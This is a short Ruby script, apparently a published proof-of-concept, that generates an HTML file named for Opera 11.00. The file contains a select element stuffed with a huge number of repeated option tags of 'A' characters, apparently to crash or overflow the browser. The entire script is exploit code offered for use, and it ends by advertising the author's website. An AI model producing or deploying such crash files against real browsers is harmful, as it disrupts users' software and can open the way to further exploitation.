print "[*]Creating the Exploit\n"
i = 0
buf = "<option>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</option>\n"
 
while i<0x4141
     buf += "<option>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</option>\n"
     i+=1
end
 
HTML =
"<html>\n"+
"<body>\n\n"+
"<select>\n\n"
 
HTML+=buf * 100
HTML += "\n\n\n\</select>\n\n"+
"</body>\n\n\n"+
"</html>\n\n\n\n\n"
 
f = File.open("Exploit_opera_11.00.html","w")
f.puts HTML
f.close
puts "\n\n\[*]File Created With Sucess"
sleep(1)
puts "[*]Go to my Site www.invasao.com.br!"
sleep(1)
